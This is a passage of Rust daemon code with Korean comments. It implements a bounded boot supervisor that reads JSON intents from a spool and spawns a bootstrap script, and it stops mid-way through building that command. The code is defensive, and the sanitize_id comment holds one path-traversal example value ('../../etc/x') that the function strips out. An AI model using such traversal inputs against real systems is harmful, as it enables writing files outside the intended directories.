//! (U-23) **부트 감독자** — 부트를 단명 훅 자식에서 떼어내 **장수 데몬이 낳게** 한다.
//!
//! ## 근본원인 R3 — 감독자가 없다
//! 지금의 부트는 **단발 체인**이다. `UserPromptSubmit` 훅이 `javis_bootstrap.py` 를
//! `setsid`→`nohup`→`&` 폴백으로 백그라운드에 던지고 즉시 사라진다. 그 뒤를 봐 주는 주체가
//! 아무도 없다:
//!   · 훅이 등록 timeout 으로 잘리면(하네스 group-kill) 부트도 함께 죽는다 —
//!     **Windows 는 `setsid` 가 아예 없어**(실측 WIN-6 `runtime\git\usr\bin\setsid.exe` 부재)
//!     `nohup` 분기가 pgid 를 분리하지 못하고 정확히 이 경로로 죽는다. 맥은 멀쩡하고 윈도우
//!     설치본만 깨지는 그 반복 사고의 한 갈래다.
//!   · 발화가 실패해도 **재시도가 없다**. 훅은 이미 종료됐고 다시 부를 사람이 없다.
//!
//! 이 모듈이 그 빈자리를 만든다: **인텐트(intent)를 스풀에 적어 두면, 데몬이 자기 cadence 로
//! 그것을 집어 부트 체인을 낳는다.** 데몬은 훅의 프로세스 그룹 밖에 있으므로 훅이 잘려도
//! 부트는 산다.
//!
//! ## 이 저장소의 제1 계약 — 오살이 오탐보다 훨씬 위험하다
//! 그래서 이 감독자는 **아무것도 죽이지 않는다.** 좌석 close·프로세스 kill·에이전트 재기동은
//! 이 파일에 **한 줄도 없고**, 그 부재를 검체(`H-BOOT-SUP-1`)가 소스 핀으로 못박는다.
//! 감독자가 할 수 있는 일은 "없는 것을 낳는 것" 하나뿐이며, 그것조차 유계다(아래).
//!
//! ## 폭주(치명위험 ①) 차단 — 유계는 **낳는 것**과 **말하는 것** 둘 다에 건다
//!
//! ### 낳는 것(프로세스)
//!   ① **시도 상한** [`MAX_ATTEMPTS`] — 인텐트 1건이 낳을 수 있는 프로세스는 최대 3개다.
//!   ② **쿨다운** [`RETRY_COOLDOWN_SECS`] — 연속 시도 사이 최소 간격(선형 백오프).
//!   ③ **메모리측 예산** — 파일 쓰기가 실패해 `attempts` 가 영원히 0 으로 남아도(읽기전용
//!      스풀·디스크 만실), 태스크 로컬 예산이 같은 유계를 **혼자서도** 성립시킨다
//!      (`effective_attempts` = 파일 ∪ 메모리의 **최댓값**). 디스크가 거짓말해도 폭주는 없다.
//!      ★그 예산 맵의 상한 집행은 **`clear()` 가 아니다**(`SupState::budget` · `tick_in`):
//!      통째로 비우면 ③이 무너지는데, ③이 필요한 상황이 정확히 '디스크 축이 이미 무너진'
//!      상황이라 **두 축이 동시에** 사라진다. 그래서 스풀에 없는 항목만 LRU 로 솎고,
//!      그래도 넘치면 **낳는 것을 멈춘다**(유계가 liveness 보다 앞이다).
//!   여기에 틱당 디스패치 상한([`MAX_DISPATCH_PER_TICK`])이 더해져, 스풀에 1만 건이 쏟아져도
//!   한 틱이 낳는 프로세스는 2개를 넘지 않는다.
//!
//! ### 말하는 것(이벤트)
//!   ④ **음성 캐시**(`SupState::undeletable` · `remove_and_gate`) — 스풀 항목 삭제가
//!      실패하면 그 항목은 **매 틱 같은 판정으로 다시 올라온다**. 발행을 삭제 결과와 묶지
//!      않으면 지워지지 않는 파일 하나가 3초마다 영구히 이벤트를 낸다. 그래서 (경로, 사유)당
//!      정확히 1건으로 접고, 회수는 **파일이 실제로 사라졌을 때만** 한다.
//!      주 경로는 Windows다: 읽기전용 속성·다른 프로세스가 연 파일에서 `remove_file` 이
//!      실패하고, `ensure_spool` 의 권한 재강제는 `#[cfg(unix)]` 라 거기서는 무력하다
//!      (`remove_spool_file` 이 속성 1회 해제로 그 한 겹을 만든다).
//!
//! ### 스캔 두 축 — 상한은 두 개이고 **독립**이다
//!   [`MAX_SCAN_ENTRIES`] 는 한 틱이 **판정**할 인텐트 수, [`MAX_GC_ENTRIES`] 는 한 틱이
//!   **검사**할 엔트리 수다. 하나로 합치면 정렬 앞쪽이 차 있는 동안 뒤쪽 쓰레기가 영원히
//!   검사되지 않아 스풀이 무한 성장한다. 상한 뒤쪽의 기아는 **회전 커서**가 닫는다
//!   (`SupState::cursor` · `scan_spool`).
//!
//! ## watchdog 틱을 절대 막지 않는다 (설계서 U-23 게이트: "틱 정지 0")
//! `governance::spawn_watchdog` 의 틱 본문은 **동기 클로저**(`AssertUnwindSafe(|| { … })`)이고
//! 그 태스크에서 `.await` 하는 것은 `tokio::time::sleep` **하나뿐**이다. 즉 틱 본문에 무엇을
//! 넣든 그것은 **블로킹**이며, 부트 1회(수십 초)를 거기 얹으면 큐 배달·승인 격상·데드맨·회수가
//! 그 시간만큼 통째로 정지한다(치명위험 ②③). 그래서 감독자는 **별도 `tokio::spawn` + 자기
//! cadence**([`SUPERVISOR_INTERVAL_SECS`])다. 이 계약은 `H-TICK-ALIVE` 가 소스 핀으로 지킨다.
//!
//! ## 인텐트에는 **명령 문자열이 없다**
//! 스풀은 상태 디렉터리 안의 평범한 파일이다. 거기 적힌 값이 곧 실행 명령이면, 그 디렉터리에
//! 쓸 수 있는 누구든 데몬 권한으로 임의 명령을 얻는다. 그래서 인텐트가 나르는 것은 **닫힌
//! enum 의 토큰**([`BootAction`]) 하나이고, 미지 토큰은 **실행되지 않고 폐기**된다
//! (`Disposition::Retire("unknown_action")`). 합성 표본(셸 명령을 action 에 넣은 인텐트)이
//! 실행되지 않는지를 단위테스트가 직접 시험한다.
//!
//! ## 롤백 (규약 6: 노브는 사고 순간에 **하나**여야 한다)
//! `CYS_BOOT_GATES=0` **마스터 스위치 하나**로 감독자가 기동하지 않는다. 축 단위 조정이
//! 필요하면 `CYS_BOOT_SUPERVISOR=0`([`ENV_SUPERVISOR`])이 있지만, 사고 순간에 사람이 쥐는
//! 손잡이는 마스터 하나다(`lib.rs ENV_BOOT_GATES` 의 규율 — 축마다 노브를 따로 두고 나중에
//! 합치는 순서는 BLOCK-3 에서 이미 실패했다).
//!
//! ## 지금 이 착지의 **정직한 범위**
//! 인텐트의 **생산자는 아직 없다**(훅·`cys hook` 측 배선은 U-24 소관 — 파일 반경 밖). 그래서
//! 프로덕션에서 스풀은 항상 비어 있고 감독자는 **아무 일도 하지 않는다** = 행동 무변경.
//! 이 단위가 착지시키는 것은 **기계장치와 계약과 그 계약을 지키는 검체**이고, 그 능력은
//! 합성 표본(임시 디렉터리 + 조작된 인텐트)으로 시험된다.

use crate::state::{now_epoch, state_dir, Daemon};
use serde_json::json;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;

// ══════════════════════════════════════════════════════════════════════════════
// 계약 상수 — 값의 정의처는 여기 하나다.
// ══════════════════════════════════════════════════════════════════════════════

/// 인텐트 **페이로드** 스키마 버전. 다르면 실행하지 않고 폐기한다(전방 호환을 침묵으로 접지
/// 않는다 — 구 데몬이 신 인텐트를 자기 방식으로 해석하는 것이 가장 나쁜 귀결이다).
pub const INTENT_SCHEMA_V: u64 = 1;

/// 스풀 디렉터리 이름. 부모는 `state_dir(socket)` 이므로 **부서 격리를 자동 상속**한다
/// (Windows 는 `%LOCALAPPDATA%\cys[\<slug>]`, unix 는 소켓과 같은 디렉터리).
const SPOOL_DIR_NAME: &str = "boot-intents";

/// 감독자 **자기 cadence**(초). watchdog(5초)과 **일부러 다른 값**이다 — 같으면 두 태스크가
/// 매 틱 같은 순간에 깨어나 프로세스 표·디스크를 동시에 두드린다(lockstep).
const SUPERVISOR_INTERVAL_SECS: u64 = 3;

/// 인텐트 1건이 낳을 수 있는 **최대 시도 수**(폭주 차단 ①). 이 값을 넘으면 재시도가 아니라
/// **폐기**다 — 무한 재시도는 이 저장소가 이미 값을 치른 실패 양식이다.
pub const MAX_ATTEMPTS: u32 = 3;

/// 연속 시도 사이 최소 간격(초 · 폭주 차단 ②). 실제 대기는 `쿨다운 × 시도횟수`(선형 백오프).
pub const RETRY_COOLDOWN_SECS: f64 = 30.0;

/// 인텐트 수명(초). 이보다 오래된 것은 실행하지 않고 폐기한다 — 30분 전 프롬프트가 지금
/// 팀을 기동시키는 것은 사용자가 기대한 인과가 아니다.
pub const INTENT_MAX_AGE_SECS: f64 = 1800.0;

/// 한 틱이 **본문을 읽어 판정하는** 스풀 엔트리 상한. 스풀이 홍수여도 틱 길이는 유계다.
const MAX_SCAN_ENTRIES: usize = 64;

/// 한 틱이 **GC 검사**(mtime metadata)하는 스풀 엔트리 상한 — 판정 상한과 **독립 축**이다.
///
/// 왜 나눴는가: 두 축이 같은 상한을 공유하면, 정렬 앞쪽 64건이 살아있는(혹은 지워지지 않는)
/// 인텐트로 차 있는 동안 **그 뒤의 쓰레기는 영원히 검사되지 않는다** — 스풀이 무한 성장한다.
/// 상한 자체는 남기되(틱 길이는 유계여야 한다) 회전 커서가 기아를 닫는다(`scan_spool`).
const MAX_GC_ENTRIES: usize = 256;

/// 지우지 못한 스풀 항목의 **음성 캐시** 상한. 캐시가 차면 새 키에 대해 **침묵**한다 —
/// 캐시를 비우는 것은 3초마다의 이벤트 폭주를 다시 여는 것과 같다(유계 파기).
const MAX_UNDELETABLE: usize = 256;

/// 한 틱이 **낳는** 프로세스 상한. 스캔 상한과 별개 축이다(64건을 읽어도 2건만 낳는다).
const MAX_DISPATCH_PER_TICK: usize = 2;

/// 태스크 로컬 예산 맵의 상한(맵 3종 방어 ①). 넘으면 통째로 비우고 이벤트를 남긴다 —
/// 24/365 데몬에서 맵이 조용히 자라는 것은 이 저장소의 알려진 누수 양식이다.
const MAX_TRACKED: usize = 128;

/// 감독자 **축 노브**. 사고 순간의 손잡이는 마스터(`CYS_BOOT_GATES=0`) 하나이고, 이것은
/// 축 단위 조정용이다.
pub const ENV_SUPERVISOR: &str = "CYS_BOOT_SUPERVISOR";

// ══════════════════════════════════════════════════════════════════════════════
// 순수 코어 — 데몬 상태도 디스크도 읽지 않는다(진리표 대상).
// ══════════════════════════════════════════════════════════════════════════════

/// 감독자가 꺼졌는가 — **마스터 스위치에 접힌** 순수 판정.
///
/// `cys::boot_gates_master_off_from` 을 **재사용**한다(규율을 두 벌로 쓰지 않는다). 기본
/// (미설정)은 켜짐이지만, 생산자가 없는 지금은 켜져 있어도 스풀이 비어 있어 **종전 동작과
/// 한 글자도 다르지 않다** — 즉 기본값이 곧 종전 동작이다.
pub fn supervisor_off_from(master_env: Option<&str>, own_env: Option<&str>) -> bool {
    cys::boot_gates_master_off_from(master_env) || own_env == Some("0")
}

/// 감독자가 할 수 있는 일의 **닫힌 집합**. 인텐트는 이 토큰만 나르며, **명령 문자열은 절대
/// 나르지 않는다**(모듈 헤더 '명령 문자열이 없다' 절).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum BootAction {
    /// 부트 체인(`<pack>/bin/javis_bootstrap.py`)을 **데몬의 자식으로** 낳는다.
    /// 멱등성은 그 스크립트가 이미 소유한 싱글플라이트 락이 보증한다(패자 = exit 11) —
    /// 세 런처(훅·`cys boot`·감독자)가 동시에 들어와도 실제 부트는 하나다.
    EnsureTeam,
}

impl BootAction {
    /// 와이어 토큰. 파일에 적히는 값이며 이 철자가 곧 계약이다.
    pub fn as_str(self) -> &'static str {
        match self {
            BootAction::EnsureTeam => "ensure-team",
        }
    }

    /// 와이어 토큰 → enum. **미지 토큰은 `None`** 이고, 호출부는 그것을 실행이 아니라
    /// 폐기로 접는다(fail-closed).
    pub fn parse(token: &str) -> Option<Self> {
        match token {
            "ensure-team" => Some(BootAction::EnsureTeam),
            _ => None,
        }
    }
}

/// 인텐트 1건에 대한 이번 틱의 **귀결**.
#[derive(Clone, Debug, PartialEq)]
pub enum Disposition {
    /// 지금 실행한다.
    Run(BootAction),
    /// 아직 이르다 — `until` 까지 기다린다(파일은 그대로 둔다).
    Wait { until: f64 },
    /// 실행하지 않고 폐기한다. 문자열은 사유(이벤트 페이로드로 나간다).
    Retire(&'static str),
}

/// 스풀에 적히는 인텐트. `action_token` 이 `String` 인 것은 의도적이다 — 미지 토큰을
/// **파싱 단계에서 잃지 않고** 폐기 사유·이벤트에 실어 보내야 무음 실패가 아니다.
#[derive(Clone, Debug, PartialEq)]
pub struct BootIntent {
    /// 스풀 파일명(확장자 제외). `sanitize_id` 를 통과한 값만 존재한다.
    pub id: String,
    /// 페이로드 스키마 버전.
    pub v: u64,
    /// 행위 토큰(원문 그대로).
    pub action_token: String,
    /// 레인 소켓 경로. 빈 값이면 감독자 자신의 소켓을 쓴다.
    pub lane: String,
    /// 이 인텐트를 낳은 좌석(있으면). 원장 기록의 surface 축이 된다.
    pub surface_id: Option<u64>,
    /// 생성 시각(epoch 초).
    pub created_at: f64,
    /// 지금까지의 시도 횟수(디스크측 예산).
    pub attempts: u32,
    /// 다음 시도 가능 시각(epoch 초).
    pub next_attempt_at: f64,
    /// 생성 사유(진단 전용 — 판정에 쓰이지 않는다).
    pub reason: String,
}

impl BootIntent {
    fn to_value(&self) -> serde_json::Value {
        json!({
            "v": self.v,
            "action": self.action_token,
            "lane": self.lane,
            "surface_id": self.surface_id,
            "created_at": self.created_at,
            "attempts": self.attempts,
            "next_attempt_at": self.next_attempt_at,
            "reason": self.reason,
        })
    }

    /// 파일 본문 → 인텐트. **형상이 틀리면 `None`** 이고 호출부는 폐기한다(조용한 기본값
    /// 채우기 금지 — 기본값으로 채우면 깨진 인텐트가 정상처럼 실행된다).
    fn from_str(id: &str, body: &str) -> Option<Self> {
        let v: serde_json::Value = serde_json::from_str(body).ok()?;
        let obj = v.as_object()?;
        Some(BootIntent {
            id: id.to_string(),
            v: obj.get("v")?.as_u64()?,
            action_token: obj.get("action")?.as_str()?.to_string(),
            lane: obj
                .get("lane")
                .and_then(|x| x.as_str())
                .unwrap_or_default()
                .to_string(),
            surface_id: obj.get("surface_id").and_then(|x| x.as_u64()),
            created_at: obj.get("created_at").and_then(|x| x.as_f64()).unwrap_or(0.0),
            // 폭 변환은 **클램프**다(governance.rs `clamp_env_u32` 와 같은 규율) — `as` 는
            // wrap 이라 거대 `attempts` 가 0·1 로 되접히면 예산 축이 통째로 뒤집힌다.
            // 거대값 → `u32::MAX` → `attempts_exhausted` 폐기 = 보수적 방향.
            attempts: u32::try_from(obj.get("attempts").and_then(|x| x.as_u64()).unwrap_or(0))
                .unwrap_or(u32::MAX),
            next_attempt_at: obj
                .get("next_attempt_at")
                .and_then(|x| x.as_f64())
                .unwrap_or(0.0),
            reason: obj
                .get("reason")
                .and_then(|x| x.as_str())
                .unwrap_or_default()
                .to_string(),
        })
    }
}

/// **디스크측 예산과 메모리측 예산의 합류** — 큰 쪽이 이긴다.
///
/// 왜 필요한가: 스풀이 읽기전용이 되거나 디스크가 만실이면 `attempts` 증가가 **영원히
/// 실패**한다. 그러면 파일만 보는 판정은 매 쿨다운마다 새로 시도해 프로세스를 무한히 낳는다
/// (치명위험 ① 그 자체). 태스크 로컬 예산은 디스크가 거짓말해도 **혼자서** 유계를 성립시킨다.
pub fn effective_attempts(file_attempts: u32, mem_attempts: u32) -> u32 {
    file_attempts.max(mem_attempts)
}

/// 인텐트 1건의 **순수 판정**. 디스크도 데몬도 보지 않는다 — 그래서 진리표로 전수 시험된다.
///
/// 순서가 곧 우선순위다: 형상 → 미지 토큰 → 만료 → 예산 소진 → 쿨다운 → 실행.
/// (만료를 예산보다 **앞**에 두는 이유: 30분 지난 인텐트는 예산이 남아 있어도 실행 대상이
/// 아니다. 반대로 두면 늙은 인텐트가 예산을 태우며 3번 더 프로세스를 낳는다.)
pub fn decide(it: &BootIntent, attempts: u32, now: f64) -> Disposition {
    if it.v != INTENT_SCHEMA_V {
        return Disposition::Retire("schema_mismatch");
    }
    let Some(action) = BootAction::parse(&it.action_token) else {
        // ★여기가 '명령 문자열 없음' 계약의 집행 지점이다. 미지 토큰은 실행 후보가 아니라
        //   폐기 대상이다 — 이 분기를 지우면 스풀이 곧 명령 실행 표면이 된다.
        return Disposition::Retire("unknown_action");
    };
    if now - it.created_at > INTENT_MAX_AGE_SECS {
        return Disposition::Retire("expired");
    }
    if attempts >= MAX_ATTEMPTS {
        return Disposition::Retire("attempts_exhausted");
    }
    if now < it.next_attempt_at {
        return Disposition::Wait {
            until: it.next_attempt_at,
        };
    }
    Disposition::Run(action)
}

/// 실패 후 다음 시도 시각 — **선형 백오프**(쿨다운 × 시도횟수).
pub fn backoff_until(attempts: u32, now: f64) -> f64 {
    now + RETRY_COOLDOWN_SECS * f64::from(attempts.max(1))
}

/// 인텐트 id 정규화. 파일명이 되므로 경로 분리자·상대참조를 **전부** 떨군다
/// (`../../etc/x` 같은 값이 스풀 밖 파일을 만들면 안 된다).
pub fn sanitize_id(raw: &str) -> String {
    let s: String = raw
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
        .take(64)
        .collect();
    if s.is_empty() {
        "intent".to_string()
    } else {
        s
    }
}

/// 감독자가 원장에 남기는 한 줄. **배달이 아니라 기계 유래 표식**이다
/// (`Origin::Boot` 기동 표식과 같은 성격 — delivery.rs `Origin::Supervisor` 문서 참조).
pub fn ledger_line(it: &BootIntent, action: BootAction) -> String {
    format!(
        "[cys-supervisor] boot-intent id={} action={} lane={} reason={}",
        it.id,
        action.as_str(),
        if it.lane.is_empty() { "-" } else { &it.lane },
        if it.reason.is_empty() { "-" } else { &it.reason }
    )
}

// ══════════════════════════════════════════════════════════════════════════════
// 스풀 — 디스크 계층
// ══════════════════════════════════════════════════════════════════════════════

/// 스풀 디렉터리. `state_dir` 하위이므로 **부서 격리를 자동 상속**한다.
pub fn spool_dir(socket_path: &Path) -> PathBuf {
    state_dir(socket_path).join(SPOOL_DIR_NAME)
}

/// 스풀 디렉터리 보장 + unix 권한 **재강제**.
///
/// `create_dir_all` 은 mode 를 **생성 시에만** 적용한다 — 이전 실행이 넓은 권한으로 남긴
/// 디렉터리는 그대로다. 그래서 매번 `set_permissions` 로 조인다(state.rs `write_operator_token`
/// 의 0600 재강제와 같은 규약).
fn ensure_spool(dir: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(())
}

fn intent_path(dir: &Path, id: &str) -> PathBuf {
    dir.join(format!("{id}.json"))
}

/// 인텐트를 스풀에 **원자적으로** 적는다(tmp → rename). unix 는 0600.
fn write_intent(dir: &Path, it: &BootIntent) -> Result<PathBuf, String> {
    ensure_spool(dir).map_err(|e| format!("스풀 생성 실패: {e}"))?;
    let body = serde_json::to_string(&it.to_value()).map_err(|e| format!("직렬화 실패: {e}"))?;
    let final_path = intent_path(dir, &it.id);
    let tmp = dir.join(format!("{}.json.tmp", it.id));
    {
        use std::io::Write;
        #[cfg(unix)]
        let mut f = {
            use std::os::unix::fs::OpenOptionsExt;
            std::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .mode(0o600)
                .open(&tmp)
                .map_err(|e| format!("임시 파일 열기 실패: {e}"))?
        };
        #[cfg(not(unix))]
        let mut f = std::fs::File::create(&tmp).map_err(|e| format!("임시 파일 열기 실패: {e}"))?;
        f.write_all(body.as_bytes())
            .map_err(|e| format!("쓰기 실패: {e}"))?;
    }
    std::fs::rename(&tmp, &final_path).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        format!("rename 실패: {e}")
    })?;
    Ok(final_path)
}

/// 부트 인텐트를 스풀에 등록한다 — **감독자의 유일한 입력구**.
///
/// ★생산자 배선은 이 착지의 범위 밖이다(훅·`cys hook` 측 = U-24 · 파일 반경 밖). 이 API 를
/// 지금 지우면 U-24 가 계약을 처음부터 다시 발명하게 되므로, 계약을 여기 못박아 둔다.
/// 단위테스트가 이 경로를 전수 구동한다.
#[allow(dead_code)]
pub fn enqueue(
    socket_path: &Path,
    id: &str,
    action: BootAction,
    lane: &str,
    surface_id: Option<u64>,
    reason: &str,
) -> Result<PathBuf, String> {
    enqueue_in(
        &spool_dir(socket_path),
        id,
        action,
        lane,
        surface_id,
        reason,
        now_epoch(),
    )
}

/// [`enqueue`] 의 **경로·시각 주입판**. 테스트가 임시 디렉터리와 가짜 시각으로 구동한다
/// (플랫폼별 `state_dir` 해소에 의존하지 않아 Windows 에서도 같은 코드가 시험된다).
fn enqueue_in(
    dir: &Path,
    id: &str,
    action: BootAction,
    lane: &str,
    surface_id: Option<u64>,
    reason: &str,
    now: f64,
) -> Result<PathBuf, String> {
    let it = BootIntent {
        id: sanitize_id(id),
        v: INTENT_SCHEMA_V,
        action_token: action.as_str().to_string(),
        lane: lane.to_string(),
        surface_id,
        created_at: now,
        attempts: 0,
        next_attempt_at: 0.0,
        reason: reason.to_string(),
    };
    write_intent(dir, &it)
}

/// 스풀 1회 스캔 결과.
struct Scan {
    /// 파싱에 성공한 인텐트(판정 후보 · [`MAX_SCAN_ENTRIES`] 상한).
    intents: Vec<BootIntent>,
    /// 디스크에서 즉시 지울 대상 — (경로, 사유). 파싱 불가·mtime 초과분.
    /// ★판정 상한과 **독립**으로 채워진다([`MAX_GC_ENTRIES`]) — 그러지 않으면 정렬 앞쪽이
    ///   살아있는 인텐트로 차 있는 동안 뒤쪽 쓰레기가 영원히 검사되지 않는다.
    garbage: Vec<(PathBuf, &'static str)>,
    /// 이번 틱에 스풀에 존재한 id **전부**(맵 retain·상한 집행의 기준집합).
    /// ★여기는 자르지 않는다 — 자르면 스풀에 실재하는 인텐트의 예산이 '없는 것' 취급돼
    ///   조용히 회수될 수 있고, 그 방향이 곧 유계 파기다.
    present: std::collections::HashSet<String>,
    /// 다음 틱이 검사를 시작할 위치(회전 커서).
    next_cursor: usize,
}

/// 스풀을 읽는다. **`*.json` 만** 본다 — 로그·tmp 는 인텐트가 아니다.
///
/// 디스크 mtime GC: 파싱 여부와 무관하게 mtime 이 [`INTENT_MAX_AGE_SECS`] 를 넘긴 파일은
/// 폐기 대상이다(본문이 깨져 `created_at` 을 못 읽는 파일도 반드시 사라지게 하는 층).
///
/// ## 두 상한은 **독립 축**이다 (결함 2b 수리)
///
/// 종전은 정렬 직후 `names.truncate(MAX_SCAN_ENTRIES)` 하나로 **판정과 GC 를 함께** 잘랐다.
/// 그러면 정렬 앞쪽 64건이 살아있는(혹은 지워지지 않는) 인텐트로 차 있는 동안 그 뒤의 쓰레기는
/// **영원히** 검사되지 않는다 = 스풀 무한 성장. 그래서:
///   · 한 틱이 **검사**하는 엔트리 수 = [`MAX_GC_ENTRIES`] (틱 길이의 유계)
///   · 그중 **판정 후보로 올리는** 인텐트 수 = [`MAX_SCAN_ENTRIES`] (한 틱이 볼 인텐트의 유계)
/// 검사 예산을 다 쓴 인텐트는 버려지지 않고 **다음 틱**에 온다 — 그 연결을 **회전 커서**가
/// 만든다. 고정 시작점이면 상한 뒤쪽은 상한을 아무리 키워도 기아 상태로 남는다.
fn scan_spool(dir: &Path, now: f64, cursor: usize) -> Scan {
    let mut intents = Vec::new();
    let mut garbage = Vec::new();
    let mut present = std::collections::HashSet::new();
    let Ok(rd) = std::fs::read_dir(dir) else {
        return Scan {
            intents,
            garbage,
            present,
            next_cursor: 0,
        };
    };
    let mut names: Vec<PathBuf> = rd
        .filter_map(|e| e.ok().map(|e| e.path()))
        .filter(|p| p.extension().is_some_and(|x| x == "json"))
        .collect();
    names.sort();
    let stem = |p: &Path| -> String {
        p.file_stem()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_default()
    };
    for p in &names {
        let id = stem(p);
        if !id.is_empty() {
            present.insert(id);
        }
    }
    let total = names.len();
    if total == 0 {
        return Scan {
            intents,
            garbage,
            present,
            next_cursor: 0,
        };
    }
    let start = cursor % total;
    let examined = total.min(MAX_GC_ENTRIES);
    for k in 0..examined {
        let p = &names[(start + k) % total];
        let id = stem(p);
        if id.is_empty() {
            continue;
        }
        // ① 디스크 mtime GC — **metadata 만** 본다. 본문을 못 읽어도 늙은 파일은 사라진다.
        let too_old = std::fs::metadata(p)
            .and_then(|m| m.modified())
            .ok()
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| now - d.as_secs_f64() > INTENT_MAX_AGE_SECS)
            .unwrap_or(false);
        if too_old {
            garbage.push((p.clone(), "mtime_gc"));
            continue;
        }
        // ② 본문 파싱 — 실패는 기본값 채우기가 아니라 폐기다.
        match std::fs::read_to_string(p) {
            Ok(body) => match BootIntent::from_str(&id, &body) {
                // 판정 후보 상한은 **여기서만** 건다 — 위 GC 는 이 상한에 굶지 않는다.
                Some(it) => {
                    if intents.len() < MAX_SCAN_ENTRIES {
                        intents.push(it);
                    }
                }
                None => garbage.push((p.clone(), "unparsable")),
            },
            // 읽기 실패는 **폐기하지 않는다** — 일시적 I/O 오류로 인텐트를 잃으면
            // 부트가 조용히 사라진다(오살보다 오탐이 낫다는 이 저장소의 방향).
            Err(_) => {}
        }
    }
    Scan {
        intents,
        garbage,
        present,
        next_cursor: (start + examined) % total,
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// 실행 — 감독자가 '낳는' 유일한 행위
// ══════════════════════════════════════════════════════════════════════════════

/// 행위 실행자. 함수 포인터인 것은 테스트가 **스폰 없이** 루프를 구동하기 위해서다
/// (실 프로세스를 낳지 않고 유계성·순서 계약을 전수 시험한다).
type Runner = fn(&Arc<Daemon>, &BootIntent, BootAction) -> Result<String, String>;

/// 스풀 항목 **제거자**. 함수 포인터인 것은 `Runner` 와 같은 이유다 — "삭제가 계속 실패한다"
/// 는 상태를 테스트가 **결정론**으로 만들 수 있어야 한다. 플랫폼 권한 조작(디렉터리 0500·
/// 읽기전용 속성)에 기대면 macOS·Windows·CI 가 서로 다른 것을 시험하게 되고, 그중 하나라도
/// "실은 삭제에 성공" 하면 유계 검체가 조용히 공전한다.
type Remover = fn(&Path) -> bool;

/// 프로덕션 제거자 — 반환값은 "**이제 이 경로에 파일이 없다**" 이다(성공 판정의 정의처).
///
/// ★Windows 가 주 경로다: 생산자(셸·훅 · U-24)가 남긴 파일에 읽기전용 속성이 걸려 있으면
/// `remove_file` 은 영구히 실패한다. `ensure_spool` 의 권한 재강제는 `#[cfg(unix)]` 라
/// Windows 에서 아무 것도 고치지 않으므로, 그 한 겹을 여기서 만든다(속성 1회 해제 후 재시도).
/// unix 에서 파일 삭제 권한은 **디렉터리** 권한이 결정하므로 같은 조작이 의미가 없고,
/// `set_readonly(false)` 는 0600 을 0666 으로 **넓히기** 때문에 unix 에서는 하지 않는다.
/// 다른 프로세스가 연 파일(백신·생산자 셸)은 그래도 실패할 수 있다 — 그 경우의 유계는
/// 음성 캐시가 책임진다.
fn remove_spool_file(p: &Path) -> bool {
    if std::fs::remove_file(p).is_ok() {
        return true;
    }
    #[cfg(windows)]
    {
        if let Ok(md) = std::fs::metadata(p) {
            let mut perm = md.permissions();
            if perm.readonly() {
                #[allow(clippy::permissions_set_readonly_false)]
                perm.set_readonly(false);
                if std::fs::set_permissions(p, perm).is_ok() && std::fs::remove_file(p).is_ok() {
                    return true;
                }
            }
        }
    }
    // 남이 이미 지웠으면 목적은 달성됐다 — 실패로 세면 음성 캐시가 헛돈다.
    !p.exists()
}

/// 인텐트 1건을 실행한다 — **원장 기록이 행위보다 앞이다**.
///
/// ★불변식(delivery.rs ①의 감독자 축): 이 순서가 뒤집히면, 감독자가 낳은 부트 체인이 pane 에
/// 글자를 밀어 넣는 순간에 원장에는 아직 아무 근거가 없다. 그 창에서 임무 게이트는 기계 push 를
/// **오너 임무로 오인**하고 자율 착수 권한을 오발급한다. `record_audited` 호출이 `runner` 호출
/// **앞**에 있어야 한다는 이 사실을 검체(`H-BOOT-SUP-2`)와 단위테스트가 소스 핀으로 못박는다.
fn dispatch_one(
    daemon: &Arc<Daemon>,
    it: &BootIntent,
    action: BootAction,
    runner: Runner,
) -> Result<String, String> {
    crate::delivery::record_audited(
        daemon,
        it.surface_id.unwrap_or(0),
        &ledger_line(it, action),
        crate::delivery::Origin::Supervisor,
        None,
    );
    runner(daemon, it, action)
}

/// [`BootAction::EnsureTeam`] 의 프로덕션 실행자 — 부트 체인을 **데몬의 자식으로** 낳는다.
///
/// 여기서 낳은 자식은 훅의 프로세스 그룹 밖에 있다. 그것이 이 단위 전체의 목적이다
/// (`setsid` 가 없는 Windows 에서 훅 절단이 곧 부트 사망이던 경로의 해소).
///
/// ★`kill_on_drop` 을 **걸지 않는다**: 감독자는 아무것도 죽이지 않는다. 자식 핸들은 즉시
/// 드롭되고 tokio 의 고아 수거기가 좀비를 거둔다 — 부트는 자기 속도로 끝까지 간다.
fn run_ensure_team(
    daemon: &Arc<Daemon>,
    it: &BootIntent,
    _action: BootAction,
) -> Result<String, String> {
    let script = cys::pack::pack_dir().join("bin").join("javis_bootstrap.py");
    if !script.is_file() {
        return Err(format!("부트 체인 부재: {}", script.display()));
    }
    let exe_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."));
    let python = crate::bundled_python3(&exe_dir).unwrap_or_else(|| "python3".to_string());
    let lane = if it.lane.is_empty() {
        daemon.socket_path.to_string_lossy().into_owned()
    } else {
        it.lane.clone()
    };
    let log = spool_dir(&daemon.socket_path)
        .parent()
        .map(|d| d.join("boot-supervisor.log"))
        .unwrap_or_else(|| PathBuf::from("boot-supervisor.log"));
    let mut cmd = tokio::process::Command::new(&python);
    cmd.arg(&script)
        .env(cys::ENV_SOCKET, &lane)
        // ★재귀 기동 차단(치명위험 ①): 이 자식의 `cys` 호출이 소켓 연결에 실패하면
        //   `spawn_detached_daemon` 으로 **라이벌 데몬**을 낳는다. 데몬이 자기 경쟁자를
        //   낳는 재귀는 폭주 경로다(main.rs office-bridge·auto-restore 와 같은 계약).
        .env("CYS_NO_AUTOSTART", "1")
